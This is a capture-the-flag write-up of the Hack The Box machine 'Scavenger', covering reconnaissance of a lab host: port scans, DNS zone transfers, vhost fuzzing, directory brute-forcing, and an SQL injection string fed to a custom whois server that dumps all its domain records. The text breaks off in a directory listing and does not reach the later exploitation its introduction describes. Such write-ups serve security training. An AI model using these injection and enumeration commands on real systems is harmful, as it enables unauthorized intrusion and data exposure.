---
title: HTB: Scavenger
url: https://0xdf.gitlab.io/2020/02/29/htb-scavenger.html
date: 2020-02-29T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-scavenger, nmap, whois, sqli, injection, zone-transfer, exim, cve-2019-10149, vhosts, wfuzz, dirsearch, wpscan, mantisbt, webshell, ir, python, python-cmd, mkfifo-shell, forward-shell, hydra, rootkit, ida, iptables, reverse-engineering, htb-stratosphere
---

![Scavenger](https://0xdfimages.gitlab.io/img/scavenger-cover.png)

Scavenger required a ton of enumeration, and I was able to solve it without ever getting a typical shell. The box is all about enumerating the different sites on the box (and using an SQL injection in whois to get them all), and finding one is hacked and a webshell is left behind. The firewall rules make getting a reverse shell impossible, but I’ll use the RCE to enumerate the box (and build a stateful Python shell in the process, though it’s not necessary). Enumerating will turn up several usernames and passwords, which I’ll use for FTP access to get more creds, the user flag, and a copy of a rootkit that’s running on the box. A combination of finding the rootkit described on a webpage via Googling and reversing to see how it’s changed gives me the ability to trigger any session to root. In Beyond Root, I’ll look more in-depth at the SQLi in the whois server, examine the iptables rules that made getting a reverse shell impossible, and show how to use CVE-2019-10149 against the EXIM mail server to get execution as root as well.

## Box Info

| Name | [Scavenger](https://hackthebox.com/machines/scavenger)  [Scavenger](https://hackthebox.com/machines/scavenger) [Play on HackTheBox](https://hackthebox.com/machines/scavenger) |
| --- | --- |
| Release Date | [17 Aug 2019](https://twitter.com/hackthebox_eu/status/1161737767879135232) |
| Retire Date | 29 Feb 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Scavenger |
| Radar Graph | Radar chart for Scavenger |
| First Blood User | 01:43:33[enjloezz enjloezz](https://app.hackthebox.com/users/23792) |
| First Blood Root | 07:03:56[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [ompamo ompamo](https://app.hackthebox.com/users/9631) |

## Recon

### nmap

`nmap` show more services than typically seen on HTB Linux boxes. There’s FTP (TCP 20/21), SSH (TCP 22), SMTP (TCP 25), whois (TCP 43), DNS (TCP/UDP 53), and HTTP (TCP 80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.155
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 14:08 EDT
Nmap scan report for 10.10.10.155
Host is up (0.040s latency).
Not shown: 65528 filtered ports
PORT   STATE  SERVICE
20/tcp closed ftp-data
21/tcp open   ftp
22/tcp open   ssh
25/tcp open   smtp
43/tcp open   whois
53/tcp open   domain
80/tcp open   http

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds

root@kali# nmap -p 20,21,22,25,43,53,80 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.155
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 14:09 EDT
Nmap scan report for 10.10.10.155
Host is up (0.037s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp open   smtp     Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello nmap.scanme.org [10.10.14.5], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
43/tcp open   whois?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   Kerberos, SSLSessionReq, TLSSessionReq:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open   domain   ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Debian
80/tcp open   http     Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port43-TCP:V=7.70%I=7%D=8/23%Time=5D602BC9%P=x86_64-pc-linux-gnu%r(Gene
...[snip]...
SF:ci,COERCIBLE\)\x20for\x20operation\x20'like'");
Service Info: Host: ib01.supersechosting.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.05 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.155
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-24 02:16 EDT
Warning: 10.10.10.155 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.155
Host is up (0.086s latency).
Not shown: 65456 open|filtered ports, 78 closed ports
PORT   STATE SERVICE
53/udp open  domain

Nmap done: 1 IP address (1 host up) scanned in 74.68 seconds

```

The OS is Debian, and based on the [Apache](https://packages.debian.org/search?keywords=apache2) and [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) versions, it’s like Debian version 9, or stretch.

The presence of DNS and whois suggest that hostnames will matter on this box, and the whois scripts return one, `www.supersechosting.htb`.

### Whois - TCP 43

#### Interacting

This is the first time I’ve run into whois on HTB. There’s a client on kali, and to test it out, I can look up the whois information for google.com:

```

root@kali# whois google.com          
   Domain Name: GOOGLE.COM                                              
   Registry Domain ID: 2138514_DOMAIN_COM-VRSN                         
   Registrar WHOIS Server: whois.markmonitor.com                        
   Registrar URL: http://www.markmonitor.com                              
   Updated Date: 2018-02-21T18:36:40Z                               
   Creation Date: 1997-09-15T04:00:00Z                                     
   Registry Expiry Date: 2020-09-14T04:00:00Z                           
   Registrar: MarkMonitor Inc.                                    
   Registrar IANA ID: 292                                        
   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com         
   Registrar Abuse Contact Phone: +1.2083895740                         
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited
   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited
   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited
   Name Server: NS1.GOOGLE.COM                                               
   Name Server: NS2.GOOGLE.COM                                                 
   Name Server: NS3.GOOGLE.COM                                                 
   Name Server: NS4.GOOGLE.COM                                         
   DNSSEC: unsigned
      URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2019-08-24T06:38:02Z <<<qq
   ...[snip]...

```

`whois` also allows me to specify the host and port of a whois server to connect to. I’ll look up google again on Scavenger. It doesn’t have results, but the banner information is useful:

```

root@kali# whois -h 10.10.10.155 -p 43 google.com
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 0 object

```

This is the domain I saw in my `nmap` script results. I can now do a `whois` on it:

```

root@kali# whois -h 10.10.10.155 -p 43 supersechosting.htb
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
% This query returned 1 object
   Domain Name: SUPERSECHOSTING.HTB
   Registrar WHOIS Server: whois.supersechosting.htb
   Registrar URL: http://www.supersechosting.htb
   Updated Date: 2018-02-21T18:36:40Z
   Creation Date: 1997-09-15T04:00:00Z
   Registry Expiry Date: 2020-09-14T04:00:00Z
   Registrar: SuperSecHosting Inc.
   Registrar IANA ID: 292
   Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb
   Registrar Abuse Contact Phone: +1.999999999
   Name Server: NS1.SUPERSECHOSTING.HTB
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2018-12-05T14:11:05Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

NOTICE: The expiration date displayed in this record is the date the
registrar's sponsorship of the domain name registration in the registry is
currently set to expire. This date does not necessarily reflect the expiration
date of the domain name registrant's agreement with the sponsoring
registrar.  Users may consult the sponsoring registrar's Whois database to
view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois
database through the use of electronic processes that are high-volume and
automated except as reasonably necessary to register domain names or
modify existing registrations; the Data in VeriSign Global Registry
Services' ("VeriSign") Whois database is provided by VeriSign for
information purposes only, and to assist persons in obtaining information
about or related to a domain name registration record. VeriSign does not
guarantee its accuracy. By submitting a Whois query, you agree to abide
by the following terms of use: You agree that you may use this Data only
for lawful purposes and that under no circumstances will you use this Data
to: (1) allow, enable, or otherwise support the transmission of mass
unsolicited, commercial advertising or solicitations via e-mail, telephone,
or facsimile; or (2) enable high volume, automated, electronic processes
that apply to VeriSign (or its computer systems). The compilation,
repackaging, dissemination or other use of this Data is expressly
prohibited without the prior written consent of VeriSign. You agree not to
use electronic processes that are automated and high-volume to access or
query the Whois database except as reasonably necessary to register
domain names or modify existing registrations. VeriSign reserves the right
to restrict your access to the Whois database in its sole discretion to ensure
operational stability.  VeriSign may restrict or terminate your access to the
Whois database for failure to abide by these terms of use. VeriSign
reserves the right to modify these terms at any time.

The Registry database contains ONLY .HTB domains and
--

```

I’ll add the following to my `/etc/hosts` file:

```
10.10.10.155 supersechosting.htb www.supersechosting.htb ns1.supersechosting.htb whois.supersechosting.htb

```

#### SQLI in WhoIs Server

Before I moved on, I realized that the server was advertising a custom name:

```

SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37

```

That’s strange. It also shows it’s running SQL. I wonder if I can inject into it? I’ll try a `'`:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechosting.htb'"
% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''supersechosting.htb'') limit 1' at line 1

```

SQL error. nice.

Ok, I’ll try to add to the end to make it true for everything. There’s also a hint in the error message above, suggesting there’s a `) limit 1` following my input.

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechosting.htb') or '1'='1'#"

```

When I run the above, whois information for several sites dump out. To process it all, I’ll write a `grep` that pulls out any domains, translate them to lowercase, and unique them:

```

root@kali# whois -h 10.10.10.155 -p 43 "supersechosting.htb') or 1=1#" | grep -oiP '[\w\.]{1,50}\.htb' | tr 'A-Z' 'a-z' | sort -u
justanotherblog.htb
ns1.supersechosting.htb
pwnhats.htb
rentahacker.htb
supersechosting.htb
whois.supersechosting.htb
www.supersechosting.htb

```

More to add to `/etc/hosts`.

I can go further with this sqli (and will in [Beyond Root](#whois-sqli)). But I’ve got what I need for now.

### DNS - TCP/UDP 53

Anytime TCP 53 is open, I’ll attempt a zone transfer. In this case, since I have the four domains. I’ll start with supersechosting.htb and see what subdomains I can find there:

```

root@kali# dig axfr supersechosting.htb @ns1.supersechosting.htb

; <<>> DiG 9.11.5-P4-5-Debian <<>> axfr supersechosting.htb @ns1.supersechosting.htb
;; global options: +cmd
supersechosting.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
supersechosting.htb.    604800  IN      NS      ns1.supersechosting.htb.
supersechosting.htb.    604800  IN      MX      10 mail1.supersechosting.htb.
supersechosting.htb.    604800  IN      A       10.10.10.155
ftp.supersechosting.htb. 604800 IN      A       10.10.10.155
mail1.supersechosting.htb. 604800 IN    A       10.10.10.155
ns1.supersechosting.htb. 604800 IN      A       10.10.10.155
whois.supersechosting.htb. 604800 IN    A       10.10.10.155
www.supersechosting.htb. 604800 IN      A       10.10.10.155
supersechosting.htb.    604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 3 604800 86400 2419200 604800
;; Query time: 41 msec
;; SERVER: 10.10.10.155#53(10.10.10.155)
;; WHEN: Sat Aug 24 02:45:02 EDT 2019
;; XFR size: 10 records (messages 1, bytes 275)

```

I can pipe that into a `grep` to get all the uniq subdomains:

```

root@kali# dig axfr supersechosting.htb @ns1.supersechosting.htb | grep -oP '\w{1,20}\.supersechosting\.htb' | sort -u
ftp.supersechosting.htb
mail1.supersechosting.htb
ns1.supersechosting.htb
root.supersechosting.htb
whois.supersechosting.htb
www.supersechosting.htb

```

I’ll add the new ones to my `/etc/hosts` file.

I’ll do the other three domains the same way:

```

root@kali# for domain in rentahacker justanotherblog pwnhats; do dig axfr $domain.htb @ns1.supersechosting.htb | grep -oP "\w{1,20}\.$domain\.htb" | sort -u; done
mail1.rentahacker.htb
sec03.rentahacker.htb
www.rentahacker.htb
mail1.justanotherblog.htb
www.justanotherblog.htb
mail1.pwnhats.htb
www.pwnhats.htb

```

And add each to my `/etc/hosts` file.

### SMTP - TCP 25

Just connecting with `nc` provides another subdomain:

```

root@kali# nc 10.10.10.155 25
220 ib01.supersechosting.htb ESMTP Exim 4.89 Sat, 24 Aug 2019 09:26:51 +0200

```

Knowing that Exim has had a bunch of vulnerabilities in the past (and recently), I ran `searchsploit`, but didn’t find anything interesting:

```

root@kali# searchsploit exim 4.89
----------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                   |  Path
                                                                 | (/usr/share/exploitdb/)
----------------------------------------------------------------- ----------------------------------------
Exim 4.89 - 'BDAT' Denial of Service                             | exploits/multiple/dos/43184.txt
----------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

I’ll play with cve-2019-10149 in [Beyond Root](#exim-exploit-cve-2019-10149).

### FTP - TCP 21

I’ll try an anonymous connection to FTP, but it doesn’t work:

```

root@kali# ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>

```

I’ll have to come back if I find creds.

### Website - TCP 80

#### Site

Visiting the site by IP returns a message about the Virtualhost not being available:

![1566631891514](https://0xdfimages.gitlab.io/img/1566631891514.png)

#### Fuzz for Subdomains

This is a good point to fuzz for subdomains. I’ll do that by sending http requests with the Host header set to a list of subdomains using `wfuzz`. I’ll run it 4 times, one for each domain I’ve identified thus far:

```

root@kali# for domain in supersechosting.htb justanotherblog.htb pwnhats.htb rentahacker.htb; do echo ===${domain}===; wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-
5000.txt -u http://10.10.10.155 -H "Host: FUZZ.$domain" --hh 81; done
===supersechosting.htb===
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.155/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200     68 L      175 W         2520 Ch        "www"
000690:  C=400     12 L       53 W          437 Ch        "gc._msdcs"
001176:  C=200     68 L      175 W         2520 Ch        "WWW"

Total time: 20.34013
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 245.6719

===justanotherblog.htb===
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.155/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200      1 L        2 W           27 Ch        "www"
000690:  C=400     12 L       53 W          437 Ch        "gc._msdcs"
001176:  C=200      1 L        2 W           27 Ch        "WWW"

Total time: 20.26476
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 246.5856

===pwnhats.htb===
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.155/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200    875 L     1300 W        31484 Ch        "www"
000690:  C=400     12 L       53 W          437 Ch        "gc._msdcs"
001176:  C=302      0 L        0 W            0 Ch        "WWW"

Total time: 20.21238
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 247.2246

===rentahacker.htb===
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.155/
Total requests: 4997

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200    140 L      627 W        11802 Ch        "www"
000690:  C=400     12 L       53 W          437 Ch        "gc._msdcs"
001176:  C=200    140 L      627 W        11802 Ch        "WWW"

Total time: 20.40194
Processed Requests: 4997
Filtered Requests: 4994
Requests/sec.: 244.9276

```

Nothing new.

#### Subdomains

I want to check the other hosts to see if any of them are different. In what is probably a bit of `bash` overkill, I’ll write a quick oneliner that will get all the subdomains from my `/etc/hosts` file, read them one by one, and for each, `curl` them, calculate the `md5sum` of the result, check it against the known hash of the error page, and print any subdomain that is different:

```

root@kali# ERROR_HASH=$(curl -s 10.10.10.155 | md5sum | cut -d' ' -f1); \
    grep 10.10.10.155 /etc/hosts | cut -d' ' -f2- | tr ' ' '\n' | while read host;
        do curl -s http://$host | md5sum | grep -q "$ERROR_HASH" || echo $host; 
    done
www.supersechosting.htb
www.justanotherblog.htb
www.pwnhats.htb
www.rentahacker.htb
sec03.rentahacker.htb

```

The only pages I need to dig into are those five.

### justanotherblog.htb

#### Site

Just an under construction image:

![1566636578638](https://0xdfimages.gitlab.io/img/1566636578638.png)

#### dirsearch

I ran `dirsearch.py` as well, but nothing interesting:

```

root@kali# dirsearch.py -u http://www.justanotherblog.htb -e php

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 5999

Error Log: /opt/dirsearch/logs/errors-19-08-24_04-50-01.log

Target: http://www.justanotherblog.htb

[04:50:01] Starting: 
[04:50:02] 403 -  309B  - /.ht_wsr.txt
[04:50:02] 403 -  302B  - /.hta
[04:50:02] 403 -  313B  - /.htaccess-marco
[04:50:02] 403 -  313B  - /.htaccess-local
[04:50:02] 403 -  311B  - /.htaccess-dev
[04:50:02] 403 -  311B  - /.htaccess.BAK
[04:50:02] 403 -  312B  - /.htaccess.bak1
[04:50:02] 403 -  311B  - /.htaccess.old
[04:50:02] 403 -  312B  - /.htaccess.orig
[04:50:02] 403 -  314B  - /.htaccess.sample
[04:50:02] 403 -  312B  - /.htaccess.save
[04:50:02] 403 -  313B  - /.htaccess_extra
[04:50:02] 403 -  311B  - /.htaccess.txt
[04:50:02] 403 -  312B  - /.htaccess_orig
[04:50:02] 403 -  310B  - /.htaccess_sc
[04:50:02] 403 -  310B  - /.htaccessBAK
[04:50:02] 403 -  310B  - /.htaccessOLD
[04:50:02] 403 -  311B  - /.htaccessOLD2
[04:50:02] 403 -  308B  - /.htaccess~
[04:50:02] 403 -  306B  - /.htgroup
[04:50:02] 403 -  311B  - /.htpasswd-old
[04:50:02] 403 -  312B  - /.htpasswd_test
[04:50:02] 403 -  308B  - /.htpasswds
[04:50:02] 403 -  306B  - /.htusers
[04:50:15] 200 -   27B  - /index.html
[04:50:16] 301 -  339B  - /javascript  ->  http://www.justanotherblog.htb/javascript/
[04:50:17] 301 -  335B  - /manual  ->  http://www.justanotherblog.htb/manual/
[04:50:17] 200 -  626B  - /manual/index.html
[04:50:19] 403 -  308B  - /phpmyadmin
[04:50:20] 403 -  309B  - /phpmyadmin/
[04:50:20] 403 -  326B  - /phpmyadmin/scripts/setup.php
[04:50:22] 403 -  311B  - /server-status
[04:50:22] 403 -  312B  - /server-status/

Task Completed

```

### supersechosting.htb

#### Site

This site is for the hosting provider:

![1566636691566](https://0xdfimages.gitlab.io/img/1566636691566.png)

#### dirsearch

`dirsearch` gives a bit more here:

```

root@kali# dirsearch.py -u http://www.supersechosting.htb -e php

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 10 | Wordlist size: 5999

Error Log: /opt/dirsearch/logs/errors-19-08-24_03-44-57.log

Target: http://www.supersechosting.htb

[03:44:58] Starting: 
[03:45:00] 403 -  309B  - /.ht_wsr.txt
[03:45:00] 403 -  302B  - /.hta
[03:45:00] 403 -  313B  - /.htaccess-local
[03:45:00] 403 -  311B  - /.htaccess.BAK
[03:45:00] 403 -  313B  - /.htaccess-marco
[03:45:00] 403 -  311B  - /.htaccess-dev
[03:45:00] 403 -  312B  - /.htaccess.bak1
[03:45:00] 403 -  311B  - /.htaccess.old
[03:45:00] 403 -  312B  - /.htaccess.orig
[03:45:00] 403 -  314B  - /.htaccess.sample
[03:45:00] 403 -  311B  - /.htaccess.txt
[03:45:00] 403 -  313B  - /.htaccess_extra
[03:45:00] 403 -  312B  - /.htaccess.save
[03:45:00] 403 -  312B  - /.htaccess_orig
[03:45:00] 403 -  310B  - /.htaccess_sc
[03:45:00] 403 -  311B  - /.htaccessOLD2
[03:45:00] 403 -  310B  - /.htaccessBAK
[03:45:00] 403 -  310B  - /.htaccessOLD
[03:45:00] 403 -  308B  - /.htaccess~
[03:45:00] 403 -  306B  - /.htgroup
[03:45:00] 403 -  311B  - /.htpasswd-old
[03:45:00] 403 -  312B  - /.htpasswd_test
[03:45:00] 403 -  308B  - /.htpasswds
[03:45:00] 403 -  306B  - /.htusers
[03:45:03] 200 -    2KB - /0
[03:45:18] 301 -  335B  - /assets  ->  http://www.supersechosting.htb/assets/
[03:45:25] 301 -  335B  - /config  ->  http://www.supersechosting.htb/config/
[03:45:27] 301 -  336B  - /content  ->  http://www.supersechosting.htb/content/
[03:45:27] 200 -   17KB - /CONTRIBUTING.md
[03:45:39] 200 -    2KB - /index
[03:45:39] 200 -    2KB - /index.php
[03:45:40] 301 -  339B  - /javascript  ->  http://www.supersechosting.htb/javascript/
[03:45:42] 200 -    1KB - /LICENSE
[03:45:45] 301 -  335B  - /manual  ->  http://www.supersechosting.htb/manual/
[03:45:45] 200 -  626B  - /manual/index.html
[03:45:52] 403 -  308B  - /phpmyadmin
[03:45:53] 403 -  309B  - /phpmyadmin/
[03:45:53] 403 -  326B  - /phpmyadmin/scripts/setup.php
[03:45:54] 301 -  336B  - /plugins  ->  http://www.supersechosting.htb/plugins/
[03:45:56] 200 -   13KB - /README.md
[03:45:59] 403 -  311B  - /server-status
[03:45:59] 403 -  312B  - /server-status/
[03:46:06] 301 -  335B  - /themes  ->  http://www.supersechosting.htb/themes/

Task Completed

```

`README.md` shows that this is [PicoCMS](https://github.com/picocms/Pico). I don’t see any immediate vulnerabilities, so moving on.

### pwnhats.htb

The site is a store for hats:

![1566651086581](https://0xdfimages.gitlab.io/img/1566651086581.png)

At the bottom I note it’s running PrestaShop. It’s also copyright 2019. I look for PrestaShop vulnerabilities, but don’t find any that recent.

### rentahacker.htb

#### Site

The site has a single post, offering hacking services for sale:

![1566637039578](https://0xdfimages.gitlab.io/img/1566637039578.png)

There are three comments on the single post:

![1566637085739](https://0xdfimages.gitlab.io/img/1566637085739.png)

The fact that someone is claiming to have hacked the site is definitely interesting.

Also, at the bottom of each page, I see this is a `wordpress` site:

![1566637160914](https://0xdfimages.gitlab.io/img/1566637160914.png)

#### wpscan

Given that this is a WP site, I’ll run `wpscan` on it:

```

root@kali# wpscan --url http://www.rentahacker.htb -e p,t,tt,u,m -o scans/wpscan_rentahacker

```

I didn’t see much of interest in the output. A bunch of authenticated vulns, but that’s not useful to me yet.

### sec03.rentahacker.htb

#### Site

The site has been defaced:

![1566651501430](https://0xdfimages.gitlab.io/img/1566651501430.png)

#### dirsearch

When I run `dirsearch` against this subdomain, there’s a lot there:

```

root@kali# dirsearch.py -u http://sec03.rentahacker.htb

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions:  | Threads: 10 | Wordlist size: 5686

Error Log: /opt/dirsearch/logs/errors-19-08-24_14-25-46.log

Target: http://sec03.rentahacker.htb

[14:25:46] Starting: 
[14:25:47] 403 -  307B  - /.ht_wsr.txt
[14:25:47] 403 -  300B  - /.hta
[14:25:47] 403 -  309B  - /.htaccess-dev
[14:25:47] 403 -  311B  - /.htaccess-marco
[14:25:47] 403 -  311B  - /.htaccess-local
[14:25:47] 403 -  309B  - /.htaccess.BAK
[14:25:47] 403 -  310B  - /.htaccess.bak1
[14:25:47] 403 -  310B  - /.htaccess.orig
[14:25:47] 403 -  312B  - /.htaccess.sample
[14:25:47] 403 -  309B  - /.htaccess.old
[14:25:47] 403 -  311B  - /.htaccess_extra
[14:25:47] 403 -  309B  - /.htaccess.txt
[14:25:47] 403 -  310B  - /.htaccess_orig
[14:25:47] 403 -  310B  - /.htaccess.save
[14:25:47] 403 -  308B  - /.htaccess_sc
[14:25:47] 403 -  308B  - /.htaccessBAK
[14:25:47] 403 -  308B  - /.htaccessOLD
[14:25:47] 403 -  309B  - /.htaccessOLD2
[14:25:47] 403 -  304B  - /.htgroup
[14:25:47] 403 -  306B  - /.htaccess~
[14:25:47] 403 -  309B  - /.htpasswd-old
[14:25:47] 403 -  310B  - /.htpasswd_test
[14:25:47] 403 -  306B  - /.htpasswds
[14:25:47] 403 -  304B  - /.htusers
[14:25:52] 301 -  328B  - /api  ->  http://sec03.rentahacker.htb/api/
[14:25:52] 403 -  300B  - /api/
[14:25:55] 200 -  896B  - /composer.json
[14:25:55] 403 -  302B  - /config
[14:25:55] 200 -   64KB - /composer.lock
[14:25:55] 403 -  310B  - /config/app.yml
[14:25:55] 403 -  317B  - /config/AppData.config
[14:25:55] 403 -  303B  - /config/
[14:25:55] 403 -  310B  - /config/apc.php
[14:25:55] 403 -  310B  - /config/aws.yml
[14:25:55] 403 -  319B  - /config/banned_words.txt
[14:25:55] 403 -  313B  - /config/config.ini
[14:25:55] 403 -  321B  - /config/database.yml.pgsql
[14:25:55] 403 -  315B  - /config/database.yml
[14:25:55] 403 -  323B  - /config/database.yml.sqlite3
[14:25:55] 403 -  316B  - /config/databases.yml
[14:25:55] 403 -  324B  - /config/database.yml_original
[14:25:55] 403 -  316B  - /config/database.yml~
[14:25:55] 403 -  317B  - /config/monkdonate.ini
[14:25:55] 403 -  315B  - /config/producao.ini
[14:25:55] 403 -  319B  - /config/monkcheckout.ini
[14:25:55] 403 -  313B  - /config/monkid.ini
[14:25:55] 403 -  313B  - /config/routes.yml
[14:25:55] 403 -  315B  - /config/settings.ini
[14:25:55] 403 -  319B  - /config/settings.ini.cfm
[14:25:55] 403 -  315B  - /config/settings.inc
[14:25:55] 403 -  321B  - /config/settings.local.yml
[14:25:55] 403 -  326B  - /config/settings/production.yml
[14:25:55] 403 -  300B  - /core
[14:25:55] 403 -  327B  - /core/fragments/moduleInfo.phtml
[14:25:56] 301 -  328B  - /css  ->  http://sec03.rentahacker.htb/css/
[14:25:56] 403 -  299B  - /doc
[14:25:56] 403 -  300B  - /doc/
[14:25:56] 403 -  315B  - /doc/en/changes.html
[14:25:56] 403 -  314B  - /doc/stable.version
[14:25:57] 301 -  330B  - /fonts  ->  http://sec03.rentahacker.htb/fonts/
[14:25:58] 301 -  331B  - /images  ->  http://sec03.rentahacker.htb/images/
[14:25:58] 200 -  107B  - /index.html
[14:25:58] 302 -    0B  - /index.php  ->  http://sec03.rentahacker.htb/login_page.php
[14:25:58] 302 -    0B  - /index.php/login/  ->  http://sec03.rentahacker.htb/login_page.php
[14:25:59] 301 -  335B  - /javascript  ->  http://sec03.rentahacker.htb/javascript/
[14:25:59] 301 -  327B  - /js  ->  http://sec03.rentahacker.htb/js/
[14:25:59] 403 -  311B  - /lang/web.config
[14:25:59] 403 -  300B  - /lang
[14:25:59] 403 -  303B  - /library
[14:26:00] 200 -    5KB - /login.php
[14:26:00] 301 -  331B  - /manual  ->  http://sec03.rentahacker.htb/manual/
[14:26:00] 200 -  626B  - /manual/index.html
[14:26:02] 403 -  306B  - /phpmyadmin
[14:26:02] 403 -  307B  - /phpmyadmin/
[14:26:03] 403 -  324B  - /phpmyadmin/scripts/setup.php
[14:26:03] 403 -  321B  - /plugins/editors/fckeditor
[14:26:03] 403 -  313B  - /plugins/fckeditor
[14:26:03] 403 -  303B  - /plugins
[14:26:03] 403 -  361B  - /plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload.swf
[14:26:03] 403 -  364B  - /plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload_f9.swf
[14:26:03] 403 -  311B  - /plugins/tinymce
[14:26:03] 403 -  312B  - /plugins/tiny_mce
[14:26:03] 403 -  313B  - /plugins/tiny_mce/
[14:26:03] 403 -  312B  - /plugins/tinymce/
[14:26:03] 403 -  314B  - /plugins/upload.php
[14:26:03] 403 -  314B  - /plugins/web.config
[14:26:03] 200 -    5KB - /readme.md
[14:26:04] 403 -  303B  - /scripts
[14:26:04] 403 -  356B  - /scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx
[14:26:04] 403 -  315B  - /scripts/cgimail.exe
[14:26:04] 403 -  315B  - /scripts/counter.exe
[14:26:04] 403 -  354B  - /scripts/ckeditor/ckfinder/core/connector/asp/connector.asp
[14:26:04] 403 -  315B  - /scripts/convert.bas
[14:26:04] 403 -  315B  - /scripts/fpcount.exe
[14:26:04] 403 -  320B  - /scripts/iisadmin/ism.dll?http/dir
